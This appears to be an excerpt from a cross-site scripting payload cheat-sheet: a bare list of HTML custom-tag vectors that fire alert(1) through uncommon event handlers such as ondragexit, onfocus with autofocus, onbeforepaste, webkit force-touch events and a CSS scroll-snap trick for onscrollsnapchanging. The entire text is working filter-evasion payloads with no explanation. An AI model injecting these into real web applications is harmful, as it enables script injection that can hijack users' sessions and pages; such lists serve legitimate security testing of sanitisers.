...
<custom tags draggable="true" ondragexit="alert(1)" style=display:block>test</custom tags>
...
<custom tags onbeforepaste=alert(1)>XSS</custom tags>
...
<custom tags oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>
...
<custom tags onfocus=alert(1) autofocus tabindex=1>
...
<custom tags onpointercancel=alert(1)>XSS</custom tags>
...
<custom tags onsecuritypolicyviolation=alert(1)>XSS</custom tags>
<custom tags ontouchcancel=alert(1)>XSS</custom tags>
<custom tags onwebkitmouseforcechanged=alert(1)>XSS</custom tags>
<custom tags onwebkitmouseforcedown=alert(1)>XSS</custom tags>
<custom tags onwebkitmouseforceup=alert(1)>XSS</custom tags>
<custom tags onwebkitmouseforcewillbegin=alert(1)>XSS</custom tags>
<custom tags onwebkitwillrevealbottom=alert(1)>XSS</custom tags>
...
<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <custom tags class="scroll-item">Item 1</custom tags><custom tags class="scroll-item">Item 2</custom tags></custom tags>
